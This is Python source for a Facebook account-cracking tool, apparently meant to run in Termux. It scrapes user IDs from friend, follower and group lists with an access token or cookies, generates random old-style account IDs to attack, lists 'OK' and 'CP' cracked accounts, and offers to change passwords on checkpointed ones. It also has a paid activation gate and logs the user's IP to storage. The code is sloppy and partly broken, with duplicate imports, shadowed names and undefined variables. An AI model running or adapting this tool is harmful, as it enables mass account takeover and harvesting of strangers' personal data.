
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import requests as req
import requests as re
import time
import random
import json
import sys
import time
import datetime
import hashlib
import platform
import re
import threading
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
import bs4
import sys
import os
import subprocess
import random
import base64
import platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as profacc
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
#utf/8/python
os.system("mkdir Dump")
import requests as req
import requests as re
import time
import random
import json
import sys
import time
import datetime
import hashlib
import platform
import re
import threading
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
import bs4
import sys
import os
import subprocess
import random
import base64
import platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup

import os
import sys
try:
    import requests
except ModuleNotFoundError:
    print("Currently Installing Module requests")
    os.system("python -m pip install requests &> /dev/null")
try:
    import bs4
except ModuleNotFoundError:
    print("Currently Installing Module bs4")
    os.system("python -m pip install bs4 &> /dev/null")
try:
    import mechanize
except ModuleNotFoundError:
    print("Sedang Install Module mechanize")
    os.system("python -m pip install mechanize &> /dev/null")
try:
    import gTTS
except ModuleNotFoundError:
    os.system("python -m pip install gTTS &> /dev/null")

import requests as ress

try:
	print("[+] Chacking Server Wait Bro ")
	time.sleep(3)
	rq = requests.get('https://raw.githubusercontent.com/Bilal-XD/Approval/main/server.txt').text
except requests.exceptions.ConnectionError:
	exit('\n[+] Server Is Ofline Bro Try Again later\n')
    
rendnm = requests.get("http://ip-api.com/json/").json()["query"]
open('/sdcard/.billu.txt','w').write(rendnm)
	
	
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.009)
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as profacc
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
try:os.remove("old.txt")
except:pass
try:os.remove("oldv2.txt")
except:pass
try:
	os.mkdir('dump')
except:pass
try:
	os.mkdir('Hasil')
except:pass


## warna public
P = '\x1b[0;97m' 
M = '\x1b[0;91m' 
H = '\x1b[0;92m' 
K = '\x1b[0;93m' 
B = '\x1b[0;94m' 
U = '\x1b[0;95m' 
O = '\x1b[0;96m' 
N = '\x1b[0m'    
I='\x1b[0;32m'
C='\x1b[0;36m'
M='\x1b[0;31m'
U='\x1b[0;35m'
K='\x1b[0;33m'
P='\x1b[00m'
H='\x1b[0;90m'
Q="\x1b[00m"
i='\x1b[0;32m'
c='\x1b[0;36m'
m='\x1b[0;31m'
u='\x1b[0;35m'
k='\x1b[0;33m'
b='\x1b[0;34m'
p='\x1b[00m'
h='\x1b[0;90m'
q="\x1b[00m"
war = (Q+"["+C+"•"+Q+"] ")
inp = (Q+"["+U+"-"+Q+"] ")
bulat = (Q+"["+C+"#"+Q+"] ")
panah2 = "\033[4;33mChoose\x1b[0m\n\033[1;91m➤\033[1;33m➤\033[1;32m➤\033[1;36m➤\x1b[0m "
garis = (war+"=====================================================")
def play_mpv(x):
	global alam
	try:
		if alam == "y" or "y" == alam:
			try:
				os.popen("play-audio "+x)
			except:pass
	except:pass
def pilih_alam():
	global alam
	pil_b = input(war+"Do you want to make a sound / alarm if the results of the crack come out? (Y/n) : ")
	if pil_b == "y" or pil_b == "Y":
		jalan(war+"If there is Mamang Garookx's voice, it's a sign that the crack results are out")
		jalan(war+"Example ...")
		alam = ("y")
		print(war+"if get OK")
		play_mpv('DING.mp3')
		time.sleep(2)
		print(war+"✓")
		print(war+"if get CP")
		play_mpv('bruh.mp3')
		time.sleep(2)
		print(war+"✓")
		return alam
	else:
		alam = ("Garoookkxxx")
		return alam				

def pilih_infong():
	global infoong
	pil_vv = input(war+"Do you want to show account information (Y/n) :")
	if pil_vv == "y" or pil_vv == "Y":
		infoong = ("y")
		return infoong
	else:
		infoong = ("Garoookkxxx")
		return infoong

from gtts import gTTS
def play_m(text):
	my_a = gTTS(text)
	my_a.save("hello.mp3")
	play_mpv('hello.mp3')		
logo = f"""        \x1b[96;1m
██╗  ██╗ █████╗ ██████╗ ██╗██████╗ 
██║ ██╔╝██╔══██╗██╔══██╗██║██╔══██╗
█████╔╝ ███████║██████╔╝██║██████╔╝
██╔═██╗ ██╔══██║██╔══██╗██║██╔══██╗
██║  ██╗██║  ██║██████╔╝██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝

            \x1b[1;92m[➤➤➤➤]\x1b[1;97mAuthor: KABIR SINGH(\x1b[1;92mHEARTLESS \x1b[1;97m)
            \033[41m\033[1;37m THE HEARTLESS \033[41m\033[1;37mKABIR\x1b[0m
        
               \033[47m\033[1;31m KABIR  SINGH \033[41m\033[1;37m X  KABIR IS ALONE :) \x1b[0m\n"""
##########
#####approvel 
def reg():
    os.system("clear")
    print(logo)
    print("")
    print("\tTool activation")
    print("")
    time.sleep(1)
    try:
        to = open("/sdcard/.abdullah.p.txt", "r").read()
    except (KeyError , IOError):
        reg2()
    r = requests.get("https://pastebin.com/raw/GsvtuSvm").text
    if to in r:
        os.system('clear')
        print(logo)
        print("")
    
        os.system("xdg-open https://www.facebook.com/D4D4HERE")
        time.sleep(5)
        print(" ")
    else:
        os.system("clear")
        print(logo)
        print("")
        print("\tRegistration Failed")
        print("")
        print(" Your key is not registered yet ")
        print("")
        print(" Copy and send key to admin")
        print("")
        print(" Your key: "+to)
        print("")
        input(" Press enter to send key")
        os.system("xdg-open https://wa.me/+923477968938")
        reg()
def reg2():
    os.system("clear")
    print(logo)
    print("")
    print("\tYour device is not registered")
    print("")
    print(" Copy and press enter , then select whatsapp to continue")
    print("")
    id = uuid.uuid4().hex[:75]
    s = open('/sdcard/.abdullah.p.txt', 'w')
    s.write(id)
    s.close()
    ids = open('/sdcard/.abdullah.p.txt', 'r').read()
    print(" Your key: "+ids)
    print("")
    print("")
    input(" Press enter to go to whatsapp ")
    os.system("xdg-open https://wa.me/+923477968938")
    input(" Press enter to check registration ")
    reg()
    
    
kiky_at = ("KangProf")
######import sys, os, subprocess, platform, struct
#####if not struct.calcsize("P")*8==64:
######        exit(Q+"["+C+"!"+Q+"]"+K+" Sorry, this script doesn't support your cellphone")

null=open(os.devnull, "w")
insta= subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
null.close()
if insta !=0:
        os.system('pkg install play-audio -y &> /dev/null')						

logo2 = f"""        \x1b[96;1m
         ██████   █████  ██████   █████  
         ██   ██ ██   ██ ██   ██ ██   ██ 
         ██   ██ ███████ ██   ██ ███████ 
         ██   ██ ██   ██ ██   ██ ██   ██ 
         ██████  ██   ██ ██████  ██   ██  

         \x1b[1;92m[➤➤➤➤]\x1b[1;97mauthor: Abdullah(\x1b[1;92mmrd4d4\x1b[1;97m)
         \033[41m\033[1;37m The unbeatable chokra \033[41m\033[1;37mMr Dada\x1b[0m
        
             \033[47m\033[1;31m Abdullah \033[41m\033[1;37m X  Bilal \x1b[0m\n"""
###### 
CP = 0
OK = 0
TP = 0
loop = 0
loop = 0
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
kx = 0
Aman = 0
Cp = 0
Salah=0
ubahP = []
pwbaru = []
ok = []
cp = []
ttl = []
fw = []
id = []
lq = []
iz = []
opq = []
olq = []
data = {}
data2 = {}
mb = "https://mbasic.facebook.com"
url_mb = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
nampung = []
data,data2={},{}
ubahP,pwBaru=[],[]

###### 
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

wwn = pilih([U, C, B, Q])

logo = f"""\x1b[96;1m
██████   █████  ██████   █████  
██   ██ ██   ██ ██   ██ ██   ██ 
██   ██ ███████ ██   ██ ███████ 
██   ██ ██   ██ ██   ██ ██   ██ 
██████  ██   ██ ██████  ██   ██  

\x1b[1;92m[➤➤➤➤]\x1b[1;97mauthor: Abdullah(\x1b[1;92mmrd4d4\x1b[1;97m)
\x1b[1;92m[➤➤➤➤]\x1b[1;97mstatus: premium
\033[41m\033[1;37m The unbeatable chokra \033[41m\033[1;37mMr Dada\x1b[0m
          
    \033[47m\033[1;31m Abdullah \033[41m\033[1;37m X  Bilal \x1b[0m\n"""



try:
	ua = open(".ua","r").read()
except:
	print (war+'All ready to update.')
	time.sleep(1)
	ua = pilih([
	"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"])
	ua1 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
		'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	ua2 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	pass
try:kiky_pass=requests.get("http://ip-api.com/json/").json()["country"].lower()
except:kiky_pass="None"

def menu():
	global ua
	os.system("clear")
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		try:
			nama = a["name"]
			gob = a["id"]
		except:
			nama = a["username"]
			gob = a["id"]
	except:
		print((war+" Token Invalid"))
		time.sleep(1)
		login()
	try:ip=requests.get("http://ip-api.com/json/").json()["query"]
	except:ip=("None")
	try:kiky=requests.get("http://ip-api.com/json/").json()["country"].lower()
	except:kiky=("None")
	try:kiky_kartu=requests.get("http://ip-api.com/json/").json()["isp"]
	except:kiky_kartu=("None")
	print (logo)
	visitor()   
	  
	url_main = "https://www.whatsmyua.info"
	s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
	raw_ua = s.find("li", id="rawUa").text
	family = s.find("li", id="family").text
	name_hp = s.find("li", id="product").text
	os_ = s.find("li", id="os").text
	ly = s.find("li", id="layout").text

	ua = raw_ua.replace("rawUa: ", "") # My Useragnet
	jenis_ua = family.replace("family: ", "")
	jenis_hp = name_hp.replace("product: ", "")
	jenis_os = os_.replace("os: ", "")
	jenis_ly = ly.replace("layout: ", "")	
	print(f"╭────────────────────────────────•")
	os.popen('play-audio selamat2.mp3')
	print(Q+"├─["+C+"•"+Q+"] Name    : "+K+nama)
	print(Q+"├─["+C+"•"+Q+"] ID      : "+K+gob)
	try:print(Q+"├─["+C+"•"+Q+"] Ip Addr : "+K+ip)
	except:pass
	print(f"{P}╰──────────────────•")
	print(f"╭─────────╮")
	jalan("│ M E N U │")
	print(f"╰─────────╯")		
	print("╭──────────────────•")
	print("├─[%s01%s] Crack from public(multi)"%(O,P))
	print("├─[%s02%s] Crack from followers"%(O,P))
	print("├─[%s03%s] Crack from Files"%(O,P))	
	print("├─[%s05%s] Create File Unlimited ID "%(O,P))	
	print("├─[%s06%s] optiont detect"%(O,P))	
	print("├─[%s07%s] Check result "%(O,P))
	print("├─[%s00%s]%s Logout%s "%(O,P,M,P))	
	print("╰──────────────────•")
	ba=input(panah2)
	if ba in [""," "]:
		print(war+"Don't Empty Bro")
		time.sleep(2)
		menu()

	elif ba in ["1","01"]:
		dump_public()
		exit()

	elif ba in ["2","02"]:
		dump_follow()
		exit()
	elif ba in ["05","5"]:
		dump_ulti()
	elif ba in ["x","X"]:
		buat_(save,saold,jaai)

	elif ba in ["xZ","xz"]:
		check_kukis()
		global nama_grup
		_mmk_ = open('.cokie.txt').read()
		kueh  = {"cookie":_mmk_}
		kontol = input(f"{war}Masukan Idz Grups Sesad : ")
		if kontol in[""," "]:
			print('\n %s[%s×%s] Don t Empty Bro !'%(N,M,N));time.sleep(2);moch_yayan()
		else:
			try:
				ajg=requests.get(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}",cookies=kueh).text
				agg=re.findall('\<span class\=\".*?\">(.*?)<\/span\>',ajg)[2]
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"\n%s[%s!%s] Sorry Idz {kontol} This Group Is Not Published"%(N,M,N));time.sleep(2);menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("\n%s[%sX%s] Sorry The Cookies You Are Currently Using, Have Been Restricted"%(N,M,N));time.sleep(2);menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"\n%s[%sX%s] Sorry Idz {kontol} This Group Was Not Found !"%(N,M,N));time.sleep(2);menu()
				else:
					nama_grup = re.findall("\<title\>(.*?)<\/title\>",ajg)[0]
					nama_grup = nama_grup.replace(" ","-")
					jalan(war+"Dump Results Saved In : "+I+"dump/"+nama_grup+".json"+Q)
					print(war+"Name Groups : "+I+re.findall("\<title\>(.*?)<\/title\>",ajg)[0]+Q)
					print("\n"+war+"Press CTRL + C To Stop !!")
					crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
			except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit("\n"+war+"Sorry Your Network, Disconnect Because It's Weak")
		crackmenu("dump/"+nama_grup+".json").passmenu("dump/"+nama_grup+".json")
		exit("\n"+war+'Done !')
	elif ba in ["3","03"]:
		cekfile("dump")
		try:
			file = input(war+"Name File : ")
			crackmenu(file).passmenu(file)
			exit()
		except FileNotFoundError:
			exit(war+'File Not Found!!')

	elif ba in ["6","06"]:
#	 	buatngecek()  V 1
		cpdetect()
		exit()

	elif ba in ["7","07"]:
		rek()
		exit()

	elif ba in ["0","00"]:
		jalan(war+"Thank You For Using My Script !!!")
		os.system("rm -rf .login.txt")
		exit()
	else:
		print(war+'Fill it Correctly Bro')	  

def buat_laporan():
	from urllib.parse import quote
	jalan(war+"Halo Silahkan Isi Data Anda Dan Pesan Laporan (Masalah) Yang Terjadi")
	anu = input(war+"Nama Anda       : ")
	anun = input(war+"Pesan (Masalah) : ")
	load()
	jalan(war+"Sedang Membuat Text (Laporan) !!")
	url_wa = "https://api.whatsapp.com/send?phone=6281326977165&text="
	tks = ("Halo Admin Jmbf :)\nInfo : \nNama Pengirim : "+anu+"\n\nPesan (Laporan) : "+anun)
	subprocess.check_output(["am", "start", url_wa+quote(tks)])
anak_hakiki_ajg = "ANAK KONTOL, SAMA AJA MACAM HAKIKI"
def load():
	_ = ""
	__ = int("50")
	___ = int("0")
	for t in range(int("50")):
		_ += "="
		__ -= 1
		___ += 1
		print(("\r[+]%s>>> %s/%s"%(_,int(__),int(___))), end=' ');sys.stdout.flush()
		time.sleep(0.10)
	print("\n")

def pro1(file,lim,savefile,saveold,kntl):
    try:
        list_akun=open(file).read().splitlines()
        with ThreadPoolExecutor(max_workers=5) as su:
                try:
                        for akun in list_akun:
                                akn=akun.split("|")
                                try:
                                    su.submit(buat_,akn[0],savefile,saveold,kntl)
#                                    su.submit(dump_public,akn[0],lim,savefile,fila)
                                except (KeyboardInterrupt,EOFError):
                                    jalan(war+"Dump Stop !!");time.sleep(4);menu()
                except (KeyboardInterrupt,EOFError):
                    exit(jalan(war+"Dump Stop !!"))
    except (KeyError, IOError):
        exit(war+"File Not Found !!")	

def buat_(idt,save,saold,jaai):
	try:
		toket = open(".login.txt","r").read()
		token = open(".login.txt","r").read()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		logs()
	idt = input(" eliter id : ")
	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
	z = json.loads(r.text)
	try:
		qqq = ("dump/"+save+".json").replace(" ","_")
		yss = open(qqq , "a+")
		for i in z["data"]:
			uid = i['id']
			nm = i['name']
			nama = i['name']
			try:
				if len(uid) < 6:
					olj=open("dump/"+saold+".json", "a+")
#					olj=open("dump/Boke.txt", "a+")
					olj.write(uid+"|"+nama+"\n")
					print(uid)
					olq.append(uid+'|'+nm)
			except:pass
			try:
				oldd = uid.split("0000")
				old = (f"10000{oldd[1]}")
				olq.append(old+'|'+nm)
				olj=open("dump/"+saold+".json", "a+")
				olj.write(old+"|"+nama+"\n")
			except:pass
			try:
				try:
					neww = uid.split("10003")
					bja = (f"10003{neww[1]}")
				except:
					try:
						neww = uid.split("10004")
						bja = (f"10004{neww[1]}")
					except:
						try:
							neww = uid.split("10006")
							bja = (f"10006{neww[1]}")
						except:
							try:
								neww = uid.split("10007")
								bja = (f"10007{neww[1]}")
							except:pass
				opq.append(bja+'|'+nm)
				olqj=open("dump/"+jaai+".json", "a+")
				olqj.write(bja+"|"+nama+"\n")
			except:pass
			id.append(uid+"|"+na)
			yss.write(uid+"|"+na+"\n")
		yss.close()
	except KeyError:pass
	rr = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
	zz = json.loads(rr.text)
	try:
		qqq = ("dump/"+save+".json").replace(" ","_")
		dump = open(qqq , "a+")
		for ii in zz["data"]:
			uid = ii['id']
			nama = ii['name']
			nm = ii['name']
			try:
				if len(uid) < 6:
					olj=open("dump/"+saold+".json", "a+")
#					olj=open("dump/Boke.txt", "a+")
					olj.write(uid+"|"+nama+"\n")
					print(uid)
					olq.append(uid+'|'+nm)
			except:pass
			try:
				oldd = uid.split("0000")
				old = (f"10000{oldd[1]}")
				olq.append(old+'|'+nm)
				olj=open("dump/"+saold+".json", "a+")
				olj.write(old+"|"+nama+"\n")
			except:pass
			lq.append(uid+'|'+nm)
			dump.write(uid+'|'+nm+'\n')
		dump.close()
	except KeyError:pass
	try:
		tmen = ("%s"%(str(len(id))))
		epeq = ("%s"%(str(len(lq))))
		oldd = ("%s"%(str(len(olq))))
		nnew = ("%s"%(str(len(opq))))
		print((("\r[NEW : %s] + %s[%sOLD %s:%s%s]%s + %s[%sPUBLIC %s:%s%s] %s+ %s[%sFOLLOW %s:%s%s]"%(nnew,pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), oldd, pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), tmen, pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]), pilih([H, M, U, I, Q, C]),  pilih([H, M, U, I, Q, C]), epeq, pilih([H, M, U, I, Q, C])))), end=' ');sys.stdout.flush()
	except Exception as e:
		print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
		pass

def rek():
#	cekfile("Hasil")
	cekfile_crk("Hasil")
	namax=input("\n"+inp+"Name File : ")
	try:
		fila=open(namax,"r").readlines()
	except FileNotFoundError:
		jalan(war+"Sorry File Not Found")
		rek()
	try:
		volak = namax.split("CP-")[1];copy_ri = ("CP");Ass = ("%s"%(K));aSs = K
	except:
		try:
			vok = namax.split("OK-")[1]
			copy_ri = ("OK")
			Ass = ("%s"%(I))
			aSs = I
		except:
			copy_ri = ("PROF-VECT")
			Ass = ("%s"%(C))
			aSs = M
	print(war+"Number of Accounts :",len(fila),"\n")
	with zthreads(max_workers=30) as (form):
		for data in fila:
			try:
				data = data.replace("\n","")
				try:user,pw,tll = data.split("|")
				except:user,pw = data.split("|");tll=(" - ")
				print(f"{Q}[{Ass}{copy_ri}{Q}] {aSs}{user}|{pw}|{tll}{Q}")
			except:pass
			time.sleep(0.01)
	input(war+'Press Enter !');time.sleep(3)
	menu()
def cpdetect():
	jalan(war+"Before continuing, please select the menu")
	print("\n[1] Check Option With File (multi)")
	print("[2] Check Option With File (user and pass)\n")
	babi = input(war+"Choose : ")
	if babi in ("1","01"):
		file_all()
		exit()
	elif babi in ("2","02"):
		manual()
		exit()
	else:
		jalan(war+"Fill Correctly Bro");time.sleep(4)
		cpdetect()
def buat_old():
	jalan(war+"Silahkan Pilih Bentuk Idz Old !")
#		   1000000000"+U+"00000
	print("[1] 1000000000"+U+"*****"+Q)
	print("[2] 100000000"+U+"******"+Q)
	print("[3] 10000000"+U+"*******"+Q)
	print("[4] 1000000"+U+"********"+Q)
	print("[5] 100000"+U+"*********"+Q)
	print("[6] 10000"+U+"**********"+Q)
	ben = input("\n"+war+"Bentuk Old : ")
	try:
		lim_ = int(input(war+"Limit : "))
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		jalan(war+"Jangan Kosong Om !");time.sleep(2)
		buat_old()
	elif ben == "1" or ben == "01":
#		      100063690353340
#		      1000000000*****
		_             = 11111
		__            = 99999
		___ ="1000000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "2" or ben == "02":
#		      100000000000000
#		      100000000******
		_            = 111111
		__           = 999999
		___ ="100000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()


	elif ben == "3" or ben == "03":
#		      100000000000000
#		      10000000*******
		_           = 1111111
		__          = 9999999
		___ ="10000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "4" or ben == "04":
#		      100000000000000
#		      1000000********
		_          = 11111111
		__         = 99999999
		___ ="1000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "5" or ben == "05":
#		      100000000000000
#		      100000*********
		_         = 111111111
		__        = 999999999
		___ ="100000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	elif ben == "6" or ben == "06":
#		      100000000000000
#		      10000**********
		_        = 1111111111
		__       = 9999999999
		___ ="10000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+"|Kiky_And_Wans_And_Jeck\n")
			old_a.close()
		except Exception as e:
			print((" Error : %s"%e)),;time.sleep(1)
		jalan(war+"Apakah Anda Mau Lasung Start Crack (Y/n): ")
		nha = input(war+"Pilih : ")
		if nha == "y" or nha == "Y":
			crackmenu("old.txt").crackold("old.txt")
			exit(war+"Done :v")
		else:
			input(war+"Tekan Enter !!");time.sleep(2)
			menu()
	else:
		jalan(war+"Isi Dengan Benar Om !");time.sleep(2)
		buat_old()
def manual():
	global user,pw,pwBar,ubahP,jarak
	jarak = ""
	ww=input(war+"Do You Want to Change Password, Account Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"New Password To Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password minimum 6 letter"))
		else:
			pwBaru.append(pwBar)
	else:pass
	user = input(war+"Username/Email/Idz : ")
	pw = input(war+"Password : ")
	cek_opsi(user, pw)
	input(war+"Back To Menu")
	menu()

def file_all():
	cekfile("Hasil")
	namax=input("\n"+inp+"Name File : ")
	try:
		fila=open(namax,"r").readlines()
	except FileNotFoundError:
		jalan(war+"Sorry File Not Found")
		cpdetect()
#	file_cepat(fila)
	file_lambat(fila)
url = "https://mbasic.facebook.com"
jarak = ""
def file_cepat(file):
	global user,pw,pwBar,ubahP,jarak
	jarak = ""
	ww=input(war+"Do You Want to Change Password, Account Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"New Password To Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password minimum 6 letter"))
		else:
			pwBaru.append(pwBar)
	else:pass
	print(war+"Number of Accounts :",len(file),"\n")
	with zthreads(max_workers=5) as (form):
		for data in file:
			try:
				data = data.replace("\n","")
				try:
					dat, data = data.split("TAP ")
				except:pass
				try:user,pw,tll = data.split("|")
				except:user,pw = data.split("|");tll=(" - ")
				user = user
				pw = pw
				ttl = tll
#				print(f"{war}{user}|{pw}|{ttl}")
				try:
					form.submit(log_hasil, user, pw)
				except:continue
			except:continue
def file_lambat(file):
	global user,pw,pwBar,ubahP,jarak,aman,cp,salah,bz
	bz = 0
	jarak = ""
	ww=input(war+"Do You Want to Change Password, Account Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"New Password To Tap Yes : ")
		if len(pwBar) <= 5:
			exit(jalan(war+"Password minimum 6 letter"))
		else:
			pwBaru.append(pwBar)
	else:pass
	print(war+"Number of Accounts :",len(file),"\n")
	for data in file:
		try:
			data = data.replace("\n","")
			data = data.replace("TAP ","")
			data = data.replace(" [AZIM-CP] ","")
			data = data.replace(" [×] ","")
			try:user,pww,tll = data.split("|")
			except:user,pww = data.split("|");tll=(" - ")
			user = user
			try:
				pww = pww.split("['")[1]
				pww = pww.split("']")[0]
				pw = pww
			except:
				pw = pww
			ttl = tll
			cek_opsi(user, pw)
		except Exception as e:print("\n[!] Error : %s"%(e));continue	

def exceptv1(userq, pwq):
	try:
		cek_opsi(userq, pwq)
	except requests.exceptions.ConnectionError:
		return exceptv1(userq, pwq)
	except:
		return exceptv1(userq, pwq)
def tanya_opsi():
	global opsii
	anjag = input(war+"Do you want to show account options (y/n) : ")
	if anjag in ["1","Yes","ya","y","Y","Ya"]:
		opsii = "y"
	else:
		opsii = ("Risky_Gtg")
def buat_gab():
	global pwBar,ubahP,jarak
	jarak = ""
	ww=input(war+"Do You Want to Change Password, Account Tap Yes (y/n): ")
	if ww in ("Y","y"):
		ubahP.append("y")
		pwBar=input(war+"New Password To Tap Yes : ")
